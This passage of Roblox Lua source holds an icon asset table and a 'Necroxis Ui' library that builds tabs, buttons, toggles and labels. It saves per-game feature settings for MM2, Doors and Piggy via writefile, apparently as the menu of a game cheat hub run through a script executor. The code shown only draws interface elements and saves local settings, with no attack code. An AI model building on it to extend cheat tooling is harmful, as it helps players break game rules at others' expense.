		["lucide-syringe"] = "rbxassetid://10734975932",
		["lucide-table"] = "rbxassetid://10734976230",
		["lucide-table-2"] = "rbxassetid://10734976097",
		["lucide-tablet"] = "rbxassetid://10734976394",
		["lucide-tag"] = "rbxassetid://10734976528",
		["lucide-tags"] = "rbxassetid://10734976739",
		["lucide-target"] = "rbxassetid://10734977012",
		["lucide-tent"] = "rbxassetid://10734981750",
		["lucide-terminal"] = "rbxassetid://10734982144",
		["lucide-terminal-square"] = "rbxassetid://10734981995",
		["lucide-text-cursor"] = "rbxassetid://10734982395",
		["lucide-text-cursor-input"] = "rbxassetid://10734982297",
		["lucide-thermometer"] = "rbxassetid://10734983134",
		["lucide-thermometer-snowflake"] = "rbxassetid://10734982571",
		["lucide-thermometer-sun"] = "rbxassetid://10734982771",
		["lucide-thumbs-down"] = "rbxassetid://10734983359",
		["lucide-thumbs-up"] = "rbxassetid://10734983629",
		["lucide-ticket"] = "rbxassetid://10734983868",
		["lucide-timer"] = "rbxassetid://10734984606",
		["lucide-timer-off"] = "rbxassetid://10734984138",
		["lucide-timer-reset"] = "rbxassetid://10734984355",
		["lucide-toggle-left"] = "rbxassetid://10734984834",
		["lucide-toggle-right"] = "rbxassetid://10734985040",
		["lucide-tornado"] = "rbxassetid://10734985247",
		["lucide-toy-brick"] = "rbxassetid://10747361919",
		["lucide-train"] = "rbxassetid://10747362105",
		["lucide-trash"] = "rbxassetid://10747362393",
		["lucide-trash-2"] = "rbxassetid://10747362241",
		["lucide-tree-deciduous"] = "rbxassetid://10747362534",
		["lucide-tree-pine"] = "rbxassetid://10747362748",
		["lucide-trees"] = "rbxassetid://10747363016",
		["lucide-trending-down"] = "rbxassetid://10747363205",
		["lucide-trending-up"] = "rbxassetid://10747363465",
		["lucide-triangle"] = "rbxassetid://10747363621",
		["lucide-trophy"] = "rbxassetid://10747363809",
		["lucide-truck"] = "rbxassetid://10747364031",
		["lucide-tv"] = "rbxassetid://10747364593",
		["lucide-tv-2"] = "rbxassetid://10747364302",
		["lucide-type"] = "rbxassetid://10747364761",
		["lucide-umbrella"] = "rbxassetid://10747364971",
		["lucide-underline"] = "rbxassetid://10747365191",
		["lucide-undo"] = "rbxassetid://10747365484",
		["lucide-undo-2"] = "rbxassetid://10747365359",
		["lucide-unlink"] = "rbxassetid://10747365771",
		["lucide-unlink-2"] = "rbxassetid://10747397871",
		["lucide-unlock"] = "rbxassetid://10747366027",
		["lucide-upload"] = "rbxassetid://10747366434",
		["lucide-upload-cloud"] = "rbxassetid://10747366266",
		["lucide-usb"] = "rbxassetid://10747366606",
		["lucide-user"] = "rbxassetid://10747373176",
		["lucide-user-check"] = "rbxassetid://10747371901",
		["lucide-user-cog"] = "rbxassetid://10747372167",
		["lucide-user-minus"] = "rbxassetid://10747372346",
		["lucide-user-plus"] = "rbxassetid://10747372702",
		["lucide-user-x"] = "rbxassetid://10747372992",
		["lucide-users"] = "rbxassetid://10747373426",
		["lucide-utensils"] = "rbxassetid://10747373821",
		["lucide-utensils-crossed"] = "rbxassetid://10747373629",
		["lucide-venetian-mask"] = "rbxassetid://10747374003",
		["lucide-verified"] = "rbxassetid://10747374131",
		["lucide-vibrate"] = "rbxassetid://10747374489",
		["lucide-vibrate-off"] = "rbxassetid://10747374269",
		["lucide-video"] = "rbxassetid://10747374938",
		["lucide-video-off"] = "rbxassetid://10747374721",
		["lucide-view"] = "rbxassetid://10747375132",
		["lucide-voicemail"] = "rbxassetid://10747375281",
		["lucide-volume"] = "rbxassetid://10747376008",
		["lucide-volume-1"] = "rbxassetid://10747375450",
		["lucide-volume-2"] = "rbxassetid://10747375679",
		["lucide-volume-x"] = "rbxassetid://10747375880",
		["lucide-wallet"] = "rbxassetid://10747376205",
		["lucide-wand"] = "rbxassetid://10747376565",
		["lucide-wand-2"] = "rbxassetid://10747376349",
		["lucide-watch"] = "rbxassetid://10747376722",
		["lucide-waves"] = "rbxassetid://10747376931",
		["lucide-webcam"] = "rbxassetid://10747381992",
		["lucide-wifi"] = "rbxassetid://10747382504",
		["lucide-wifi-off"] = "rbxassetid://10747382268",
		["lucide-wind"] = "rbxassetid://10747382750",
		["lucide-wrap-text"] = "rbxassetid://10747383065",
		["lucide-wrench"] = "rbxassetid://10747383470",
		["lucide-x"] = "rbxassetid://10747384394",
		["lucide-x-circle"] = "rbxassetid://10747383819",
		["lucide-x-octagon"]= "rbxassetid://10747384037",
		["lucide-x-square"] = "rbxassetid://10747384217",
		["lucide-zoom-in"] = "rbxassetid://10747384552",
		["lucide-zoom-out"] = "rbxassetid://10747384679",
	},
}




local FirstTab = true
local lp = game.Players.LocalPlayer
local mouse = lp:GetMouse()
local run = game:GetService("RunService")
local gameinfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)

local UILIB = {}

UILIB.__index = UILIB


function UILIB:Load(title,version)

	LoadUI()
	local parent  = UI["1"]
--	Dragify(UI["1"].Main.Line.Title,UI["1"].Main)
	UI["1"].Main.Line.Title["PlaceName"].Text = title or "Necroxis Ui"
	UI["1"].Main.Line.Title["Version"].Text = version or "1.0"
	--Loading Things ig
	function UILIB:Toggle()
		if not UI["1"].Enabled then
	        UI["1"].Enabled = true
	        game.TweenService:Create(UI["1"].Main, TweenInfo.new(0.26), {GroupTransparency = 0}):Play()
	    else
	        game.TweenService:Create(UI["1"].Main, TweenInfo.new(0.26), {GroupTransparency = 1}):Play()
		    wait(0.26)
		    UI["1"].Enabled = false
		end
	end
	function UILIB.newTab(titleTab, icon)
		local section = setmetatable({}, UILIB)
		local TabButton = Instance.new('TextButton', UI["1"].Main.MainTabs.Tabs);
		
		do
			
			
			TabButton.Active = false;
			TabButton.TextTransparency = 1;
			TabButton.Text = '';
			TabButton.Size = UDim2.new(0, 118, 0, 86);
			TabButton.Name = 'TabButton';
			TabButton.Position = UDim2.new(0, 0, 0, 0);
			TabButton.Selectable = false;
			TabButton.BorderColor3 = Color3.fromRGB(0, 0, 0);
			TabButton.BorderSizePixel = 0;
			TabButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


			local Off: UIGradient = Instance.new('UIGradient', TabButton);
			Off.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0, Color3.fromRGB(7, 7, 7)),
				ColorSequenceKeypoint.new(1, Color3.fromRGB(16, 16, 16))
			};
			Off.Name = 'Off';
			Off.Rotation = -60;


			local UICorner_8: UICorner = Instance.new('UICorner', TabButton);
			UICorner_8.CornerRadius = UDim.new(0, 3);


			local Title: TextLabel = Instance.new('TextLabel', TabButton);
			Title.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
			Title.TextColor3 = Color3.fromRGB(255, 255, 255);
			Title.BorderColor3 = Color3.fromRGB(0, 0, 0);
			Title.Text = 'Holder';
			Title.Name = 'Title';
			Title.Size = UDim2.new(0.730234623, 0, 0.783, 0);
			Title.BackgroundTransparency = 1;
			Title.TextXAlignment = Enum.TextXAlignment.Left;
			Title.Position = UDim2.new(0.292824954, 0, 0.119, 0);
			Title.BorderSizePixel = 0;
			Title.TextSize = 14;
			Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


			local Icon: ImageLabel = Instance.new('ImageLabel', TabButton);
			Icon.ScaleType = Enum.ScaleType.Fit;
			Icon.BorderColor3 = Color3.fromRGB(0, 0, 0);
			Icon.Image = 'rbxassetid://16167593004';
			Icon.BackgroundTransparency = 1;
			Icon.Position = UDim2.new(0.079926178, 0, 0.177, 0);
			Icon.Name = 'Icon';
			Icon.Size = UDim2.new(0.185001388, 0, 0.638, 0);
			Icon.BorderSizePixel = 0;
			Icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


			local On: UIGradient = Instance.new('UIGradient', TabButton);
			On.Enabled = false;
			On.Name = 'On';
			On.Color = ColorSequence.new{
				ColorSequenceKeypoint.new(0, Color3.fromRGB(248, 248, 248)),
				ColorSequenceKeypoint.new(1, Color3.fromRGB(239, 239, 239))
			};
			On.Rotation = -60;
		end
		TabButton.Name = titleTab
		TabButton.Parent = UI["1"].Main.MainTabs.Tabs
		TabButton.Title.Text = titleTab
		TabButton.Visible = true
		TabButton.Icon.Image = icon
		local Tabs: Frame = Instance.new('Frame', UI["1"].Main.MainTabs.Tabs);
		do
			Tabs.Visible = false
			
			Tabs.BorderColor3 = Color3.fromRGB(0, 0, 0);
			Tabs.BackgroundTransparency = 1;
			Tabs.Position = UDim2.new(0.286466151, 0, 0.152, 0);
			Tabs.Name = 'Tabs';
			Tabs.Size = UDim2.new(0.681571126, 0, 0.799, 0);
			Tabs.BorderSizePixel = 0;
			Tabs.BackgroundColor3 = Color3.fromRGB(45, 45, 45);


			local ScrollingFrame: ScrollingFrame = Instance.new('ScrollingFrame', Tabs);
			ScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0);
			ScrollingFrame.Active = true;
			ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y;
			ScrollingFrame.VerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Left;
			ScrollingFrame.Size = UDim2.new(0.996998668, 0, 0.997, 0);
			ScrollingFrame.ScrollBarThickness = 0;
			ScrollingFrame.BackgroundTransparency = 1;
			ScrollingFrame.Position = UDim2.new(-0.003427024, 0, 0, 0);
			ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0);
			ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
			ScrollingFrame.BorderSizePixel = 0;
			ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0);


			local UIPadding: UIPadding = Instance.new('UIPadding', ScrollingFrame);


			local UIListLayout_2: UIListLayout = Instance.new('UIListLayout', ScrollingFrame);
			UIListLayout_2.Padding = UDim.new(0, 5);
			UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder;


			local UICorner_3: UICorner = Instance.new('UICorner', Tabs);
			UICorner_3.CornerRadius = UDim.new(0, 3);
		end
		Tabs.Name = titleTab.."_Tab"
		Tabs.Parent = UI["1"].Main
		Tabs.ScrollingFrame["Name"] = titleTab.."_sb"

		if FirstTab == true then
			FirstTab = false
			TabButton.On.Enabled = true
			TabButton.Off.Enabled = false
			TabButton.Title["TextColor3"] = Color3.fromRGB(0, 0, 0);
			TabButton.Icon["ImageColor3"] = Color3.fromRGB(0, 0, 0);
			for i,v in pairs(UI["1"].Main:GetChildren()) do
				if v.Name == titleTab.."_Tab" and v.ClassName == "Frame" and v.Name ~= "Line" and v.Name ~= "MainTabs" and v.Name ~= "Tabs" then
					v.Visible = true
				end
			end
			for i,v in pairs(UI["1"].Main:GetChildren()) do
				if v.Name ~= titleTab.."_Tab" and v.ClassName == "Frame" and v.Name ~= "Line" and v.Name ~= "MainTabs" and v.Name ~= "Tabs" then
					v.Visible = false
				end
			end
		end
		TabButton.MouseButton1Click:Connect(function()
			TabButton.On.Enabled = true
			TabButton.Off.Enabled = false
			TabButton.Title["TextColor3"] = Color3.fromRGB(0, 0, 0);
			TabButton.Icon["ImageColor3"] = Color3.fromRGB(0, 0, 0);
			for i,v in pairs(UI["1"].Main:GetChildren()) do
				if v.Name == titleTab.."_Tab" and v.ClassName == "Frame" and v.Name ~= "Line" and v.Name ~= "MainTabs" and v.Name ~= "Tabs" then
					v.Visible = true
				end
			end
			for i,v in pairs(UI["1"].Main:GetChildren()) do
				if v.Name ~= titleTab.."_Tab" and v.ClassName == "Frame" and v.Name ~= "Line" and v.Name ~= "MainTabs" and v.Name ~= "Tabs" then
					v.Visible = false
				end
			end
			for i,v in pairs(UI["1"].Main.MainTabs.Tabs:GetChildren()) do
				if v.Name ~= titleTab and v.ClassName == "TextButton" and v.ClassName ~= "UIGridLayout" and v.ClassName ~= "UIPadding" then
					v.On.Enabled = false
					v.Off.Enabled = true
					v.Title["TextColor3"] = Color3.fromRGB(255, 255, 255);
					v.Icon["ImageColor3"] = Color3.fromRGB(255, 255, 255);
				end
			end
			print(titleTab,TabButton.Name)
		end)
		function section:GetTabButton()

		    return TabButton

		end
	    function section:ChangeTBColor(Config)
		    TabButton[Config.Type].Color = Config.Color
	    end
	function section.newVPF(title,InstanceTable,cb)
	    task.defer(function() 
			local TabC = Tabs[titleTab.."_sb"]
			local ViewportFrame: Frame = Instance.new('Frame', TabC);
			local VPF_Functions = {}
			do 
				ViewportFrame.Name = 'ViewportFrame';
				ViewportFrame.BorderColor3 = Color3.fromRGB(0, 0, 0);
				ViewportFrame.Size = UDim2.new(1, 0, 0.748, 0);
				ViewportFrame.BorderSizePixel = 0;
				ViewportFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local ScrollingFrame: ScrollingFrame = Instance.new('ScrollingFrame', ViewportFrame);
				ScrollingFrame.Active = true;
				ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y;
				ScrollingFrame.ScrollBarThickness = 0;
				ScrollingFrame.Size = UDim2.new(1.00211668, 0, 0.787, 0);
				ScrollingFrame.BackgroundTransparency = 1;
				ScrollingFrame.Position = UDim2.new(-0.002524452, 0, 0.173, 0);
				ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
				ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0);
				ScrollingFrame.BorderSizePixel = 0;
				ScrollingFrame.CanvasSize = UDim2.new(0, 0, 2, 0);


				local UIPadding: UIPadding = Instance.new('UIPadding', ScrollingFrame);
				UIPadding.PaddingTop = UDim.new(0, 5);
				UIPadding.PaddingBottom = UDim.new(0, 12);
				UIPadding.PaddingRight = UDim.new(0, 5);
				UIPadding.PaddingLeft = UDim.new(0, 5);


				local UIGridLayout: UIGridLayout = Instance.new('UIGridLayout', ScrollingFrame);
				UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder;
				UIGridLayout.CellSize = UDim2.new(0.239999995, 0, 0.6, 0);


				local UIPadding_1: UIPadding = Instance.new('UIPadding', ViewportFrame);
				UIPadding_1.PaddingTop = UDim.new(0, 5);
				UIPadding_1.PaddingBottom = UDim.new(0, 5);
				UIPadding_1.PaddingRight = UDim.new(0, 5);
				UIPadding_1.PaddingLeft = UDim.new(0, 5);


				local UICorner_1: UICorner = Instance.new('UICorner', ViewportFrame);
				UICorner_1.CornerRadius = UDim.new(0, 5);


				local UIGradient: UIGradient = Instance.new('UIGradient', ViewportFrame);
				UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 35)),	ColorSequenceKeypoint.new(1, Color3.fromRGB(24, 24, 24))};
				UIGradient.Rotation = -105;


				local TextLabel: TextLabel = Instance.new('TextLabel', ViewportFrame);
				TextLabel.LayoutOrder = -1;
				TextLabel.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.Medium, Enum.FontStyle.Normal);
				TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255);
				TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0);
				TextLabel.Text = title;
				TextLabel.Size = UDim2.new(0.974347532, 0, 0.15, 0);
				TextLabel.Position = UDim2.new(0.025244517, 0, 0.013, 0);
				TextLabel.BackgroundTransparency = 1;
				TextLabel.TextXAlignment = Enum.TextXAlignment.Left;
				TextLabel.BorderSizePixel = 0;
				TextLabel.TextWrapped = true;
				TextLabel.TextSize = 21;
				TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local Line: Frame = Instance.new('Frame', ViewportFrame);
				Line.AnchorPoint = Vector2.new(0.5, 0.5);
				Line.Name = 'Line';
				Line.Position = UDim2.new(0.5, 0, 0.165, 0);
				Line.BorderColor3 = Color3.fromRGB(0, 0, 0);
				Line.Size = UDim2.new(0.925000012, 0, 0.005, 0);
				Line.BorderSizePixel = 0;
				Line.BackgroundColor3 = Color3.fromRGB(255, 255, 255);



			end
			local LastTable = nil
			local function Update()
			    
			    for i,v in ipairs(ViewportFrame.ScrollingFrame:GetChildren()) do
					 if v.ClassName == "ViewportFrame" then 
					    
					    v:Destroy() end end
			   for i,v in ipairs(InstanceTable)do
				
				local ViewportFrameButton: ViewportFrame = Instance.new('ViewportFrame',ViewportFrame.ScrollingFrame);
		--ocal cam = Instance.new("Camera",ViewportFrameButton)


			
				ViewportFrameButton.Name = 'ViewportFrameButton';
				ViewportFrameButton.Ambient = Color3.fromRGB(255, 255, 255);
				ViewportFrameButton.Position = UDim2.new(0, 0, -0, 0);
				ViewportFrameButton.BorderColor3 = Color3.fromRGB(0, 0, 0);
				ViewportFrameButton.Size = UDim2.new(0.202091962, 0, 0.529, 0);
				ViewportFrameButton.BorderSizePixel = 0;
					local Button: TextButton = Instance.new('TextButton',ViewportFrameButton);
						Button.Name = 'Button';
						Button.BorderColor3 = Color3.fromRGB(0, 0, 0);
						Button.Size = UDim2.new(1,0,1,0);
						Button.BorderSizePixel = 0;
						Button.BackgroundTransparency = 1
						Button.TextTransparency = 1
			
				ViewportFrameButton.BackgroundColor3 = Color3.fromRGB(54, 54, 54);
				local UICorner: UICorner = Instance.new('UICorner', ViewportFrameButton);
				UICorner.CornerRadius = UDim.new(0, 5);
			

    local model = Instance.new("Model",ViewportFrameButton)
				local base = v:Clone()
				base.Parent = model
				
				base.Orientation = Vector3.new(0,0,0)
				base.Anchored = true
				ViewportFrameButton.Button.MouseButton1Click:Connect(function() cb(v) end)
		    local camera = Instance.new("Camera")
    camera.FieldOfView = 70
    camera.Parent = ViewportFrameButton
    
    
    ViewportFrameButton.CurrentCamera = camera
    
    
    local vpfModel = ViewportModelClass.new(ViewportFrameButton, camera)
    local cf, size = model:GetBoundingBox()
    
    vpfModel:SetModel(model)
    
    local theta = 0
    local orientation = CFrame.new()
    local distance = vpfModel:GetFitDistance(cf.Position)
  task.defer(function()
    game:GetService("RunService").RenderStepped:Connect(function(dt)
        theta = theta + math.rad(20 * dt)
        orientation = CFrame.fromEulerAnglesYXZ(math.rad(-20), theta, 0)
        camera.CFrame = CFrame.new(cf.Position) * orientation * CFrame.new(0, 0, distance)
    end)
    end)
--[[
				task.defer(function()
					while task.wait() do
						local spin = game.TweenService:Create(base,TweenInfo.new(5,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{Orientation = Vector3.new(0,360,0)})
						spin:Play()
						spin.Completed:Wait()
						if CheckTableEquality(LastTable,InstanceTable) then
						    break
						    end
					end
				end)
		]]
			end
			end
			Update()
			function VPF_Functions:GetTable()
				return InstanceTable
			end
			function VPF_Functions:Change(Value)

				InstanceTable = Value
Update()
			end
			function VPF_Functions:Update()
				Update()
			end
			return VPF_Functions
			end)
		end
		--<< BUTTON >>--
		function section.newButton(title, cb)
		    task.defer(function() 
			local TabC = Tabs[titleTab.."_sb"]
			--local Button = reserved.Button:Clone()
			local Button= Instance.new('TextButton', TabC);
			do
				
				Button.Visible = false;
				Button.Active = false;
				Button.TextTransparency = 1;
				Button.Text = '';
				Button.Size = UDim2.new(0.996690273, 0, 0.143, 0);
				Button.Name = 'Button';
				Button.Position = UDim2.new(-7.5e-08, 0, 0, 0);
				Button.Selectable = false;
				Button.BorderColor3 = Color3.fromRGB(0, 0, 0);
				Button.BorderSizePixel = 0;
				Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local UIGradient_2: UIGradient = Instance.new('UIGradient', Button);
				UIGradient_2.Color = ColorSequence.new{
					ColorSequenceKeypoint.new(0, Color3.fromRGB(47, 47, 47)),
					ColorSequenceKeypoint.new(1, Color3.fromRGB(56, 56, 56))
				};
				UIGradient_2.Rotation = -60;


				local UICorner_6: UICorner = Instance.new('UICorner', Button);
				UICorner_6.CornerRadius = UDim.new(0, 4);


				local TextLabel_2: TextLabel = Instance.new('TextLabel', Button);
				TextLabel_2.TextWrapped = true;
				TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255);
				TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0);
				TextLabel_2.Text = 'ButtonHolder';
				TextLabel_2.Size = UDim2.new(0.831852794, 0, 0.646, 0);
				TextLabel_2.Position = UDim2.new(0.038410999, 0, 0.172, 0);
				TextLabel_2.BorderSizePixel = 0;
				TextLabel_2.BackgroundTransparency = 1;
				TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left;
				TextLabel_2.TextSize = 14;
				TextLabel_2.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
				TextLabel_2.TextScaled = true;
				TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local ImageLabel: ImageLabel = Instance.new('ImageLabel', Button);
				ImageLabel.ScaleType = Enum.ScaleType.Fit;
				ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0);
				ImageLabel.Size = UDim2.new(0.061761726, 0, 0.66, 0);
				ImageLabel.Position = UDim2.new(0.947579503, 0, 0.483, 0);
				ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5);
				ImageLabel.Image = 'rbxassetid://14976970435';
				ImageLabel.BackgroundTransparency = 1;
				ImageLabel.ImageRectSize = Vector2.new(108, 108);
				ImageLabel.BorderSizePixel = 0;
				ImageLabel.ImageRectOffset = Vector2.new(512, 908);
				ImageLabel.AutomaticSize = Enum.AutomaticSize.XY;
				ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
			end


			Button.Name = title.."_Button"
			Button.TextLabel.Text = title
			Button.Visible = true
			Button.Parent = TabC
			Button.MouseButton1Click:Connect(function() cb() end)
			end)
		end
		--<< TOGGLE >>--
		function section.newToggle(title, default , cb)

		    task.defer(function() 

			local TabC = Tabs[titleTab.."_sb"]
			
			local Toggle: TextButton = Instance.new('TextButton',TabC);
			do
				
				
				Toggle.Active = false;
				Toggle.TextTransparency = 1;
				Toggle.Text = '';
				Toggle.Size = UDim2.new(0.996690273, 0, 0.143, 0);
				Toggle.Name = 'Toggle';
				Toggle.Position = UDim2.new(-7.5e-08, 0, 0, 0);
				Toggle.Selectable = false;
				Toggle.BorderColor3 = Color3.fromRGB(0, 0, 0);
				Toggle.BorderSizePixel = 0;
				Toggle.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local UIGradient_4: UIGradient = Instance.new('UIGradient', Toggle);
				UIGradient_4.Color = ColorSequence.new{
					ColorSequenceKeypoint.new(0, Color3.fromRGB(47, 47, 47)),
					ColorSequenceKeypoint.new(1, Color3.fromRGB(56, 56, 56))
				};
				UIGradient_4.Rotation = -60;


				local UICorner_9: UICorner = Instance.new('UICorner', Toggle);
				UICorner_9.CornerRadius = UDim.new(0, 4);


				local TextLabel_4: TextLabel = Instance.new('TextLabel', Toggle);
				TextLabel_4.TextWrapped = true;
				TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255);
				TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0);
				TextLabel_4.Text = 'ToggleHolder';
				TextLabel_4.Size = UDim2.new(0.831852794, 0, 0.646, 0);
				TextLabel_4.Position = UDim2.new(0.038410999, 0, 0.172, 0);
				TextLabel_4.BorderSizePixel = 0;
				TextLabel_4.BackgroundTransparency = 1;
				TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left;
				TextLabel_4.TextSize = 14;
				TextLabel_4.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
				TextLabel_4.TextScaled = true;
				TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local Enabled: ImageLabel = Instance.new('ImageLabel', Toggle);
				Enabled.BorderColor3 = Color3.fromRGB(0, 0, 0);
				Enabled.Name = 'Enabled';
				Enabled.Size = UDim2.new(0.049409382, 0, 0.528, 0);
				Enabled.AnchorPoint = Vector2.new(0.5, 0.5);
				Enabled.Image = 'rbxassetid://3926309567';
				Enabled.BackgroundTransparency = 1;
				Enabled.ImageTransparency = 1;
				Enabled.ImageRectSize = Vector2.new(48, 48);
				Enabled.Position = UDim2.new(0.949999988, 0, 0.5, 0);
				Enabled.ImageRectOffset = Vector2.new(784, 420);
				Enabled.BorderSizePixel = 0;
				Enabled.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local Disabled: ImageLabel = Instance.new('ImageLabel', Toggle);
				Disabled.BorderColor3 = Color3.fromRGB(0, 0, 0);
				Disabled.Name = 'Disabled';
				Disabled.Size = UDim2.new(0.049409382, 0, 0.528, 0);
				Disabled.AnchorPoint = Vector2.new(0.5, 0.5);
				Disabled.Image = 'rbxassetid://3926309567';
				Disabled.BackgroundTransparency = 1;
				Disabled.ImageRectSize = Vector2.new(48, 48);
				Disabled.Position = UDim2.new(0.949999988, 0, 0.5, 0);
				Disabled.ImageRectOffset = Vector2.new(628, 420);
				Disabled.BorderSizePixel = 0;
				Disabled.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
			end
			Toggle.Name = title.."_Toggle_BODY"
			Toggle.TextLabel.Text = title
			Toggle.Visible = true
			Toggle.Parent = TabC
			local TOGGLEFUNCT = {}
			local ts,ti = game.TweenService,TweenInfo.new(.5,Enum.EasingStyle.Quint)
			local toggled = default
			local function save()
			    local a
			    if GameConfig == "MM2" then
			        a = mm2_features
			    elseif GameConfig == "MMV" then
			        a = mmv_features
			    elseif GameConfig == "Doors" then
			        a = doors_features
			    elseif GameConfig == "Piggy" then
			        a = piggy_features
			    else
			        return
			    end
			    writefile("Necroxis/" .. GameConfig .. "/Setup.lua", game:GetService("HttpService"):JSONEncode(a))
			end
			local function UpdateToggle()
				toggled = not toggled
				if toggled then
					ts:Create(TabC[title.."_Toggle_BODY"].Enabled,ti,{ImageTransparency=0}):Play()
					ts:Create(TabC[title.."_Toggle_BODY"].Disabled,ti,{ImageTransparency=1}):Play()
				else
					ts:Create(TabC[title.."_Toggle_BODY"].Enabled,ti,{ImageTransparency=1}):Play()
					ts:Create(TabC[title.."_Toggle_BODY"].Disabled,ti,{ImageTransparency=0}):Play()
				end
				cb(toggled)
				save()
			end
			if toggled then
			    ts:Create(TabC[title.."_Toggle_BODY"].Enabled,ti,{ImageTransparency=0}):Play()
				ts:Create(TabC[title.."_Toggle_BODY"].Disabled,ti,{ImageTransparency=1}):Play()
				wait(0.8)
				pcall(function()
				    cb(toggled)
			    end)
			end
			Toggle.MouseButton1Click:Connect(function() UpdateToggle() end) 
			function TOGGLEFUNCT:UpdateTGL()
			    UpdateToggle()
			end
			return TOGGLEFUNCT
			end)
		end
		--<< TEXT/LABEL >>--
		function section.newLabel(title)
		    task.defer(function() 
			local TabC = Tabs[titleTab.."_sb"]
			local Label = {}
			local FLabel = {}
			do 
				-- StarterGui.Necroxis.Object.Text
				Label["3"] = Instance.new("Frame",TabC);
				Label["3"]["BorderSizePixel"] = 0;
				Label["3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
				Label["3"]["Size"] = UDim2.new(0.997, 0, 0.16769, 0);
				Label["3"]["Position"] = UDim2.new(0, 0, 0, 0);
				Label["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
				Label["3"]["Name"] = title.."_Label";


				-- StarterGui.Necroxis.Object.Text.UICorner
				Label["4"] = Instance.new("UICorner", Label["3"]);
				Label["4"]["CornerRadius"] = UDim.new(0, 3);


				-- StarterGui.Necroxis.Object.Text.TextLabel
				Label["5"] = Instance.new("TextLabel", Label["3"]);
				Label["5"]["TextWrapped"] = true;
				Label["5"]["BorderSizePixel"] = 0;
				Label["5"]["TextScaled"] = true;
				Label["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
				Label["5"]["TextSize"] = 14;
				Label["5"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
				Label["5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
				Label["5"]["BackgroundTransparency"] = 1;
				Label["5"]["Size"] = UDim2.new(0.95738, 0, 0.80201, 0);
				Label["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
				Label["5"]["Text"] = [[Text]];
				Label["5"]["Position"] = UDim2.new(0.02215, 0, 0.12176, 0);


				-- StarterGui.Necroxis.Object.Text.Black
				Label["6"] = Instance.new("UIGradient", Label["3"]);
				Label["6"]["Rotation"] = -60;
				Label["6"]["Name"] = [[Black]];
				Label["6"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(69, 69, 69)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(64, 64, 64))};


				-- StarterGui.Necroxis.Object.Text.Custom
				Label["7"] = Instance.new("UIGradient", Label["3"]);
				Label["7"]["Rotation"] = -60;
				Label["7"]["Name"] = [[Custom]];
				Label["7"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(188, 188, 188)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(193, 193, 193))};
			end
			local function Update()
				Label["3"].Name = title.."_Label"
				Label["3"].TextLabel.Text = title
			end
			Update()
			function FLabel:SetColor(Config)
				if Config.ColorBg == nil or Config.ColorBg == "Black" then
					Label["3"].Black.Enabled = true
					Label["3"].Custom.Enabled = false
				else
					Label["3"].Black.Enabled = false
					Label["3"].Custom.Enabled = true
					Label["3"].BackgroundColor3 = Config.ColorBg
				end
				if Config.TextColor == nil or Config.TextColor == "Black" then
					return
				else
					Label["3"].TextLabel.TextColor3 = Config.TextColor
				end
				--End
			end
			function FLabel:SetText(text)
				print("set")
				title = text
				Update()
			end
			function FLabel:GetLabel()
				return Label["3"]
			end
			return FLabel
			end)
		end
		--<< TEXTBOX >>--
		function section.newTextBox(title, default, cb)
		    task.defer(function() 
			local TabC = Tabs[titleTab.."_sb"]
			local Textbox = Instance.new('Frame');
			do

				Textbox.Visible = false;
				Textbox.Name = 'Textbox';
				Textbox.Position = UDim2.new(-7.5e-08, 0, 0, 0);
				Textbox.BorderColor3 = Color3.fromRGB(0, 0, 0);
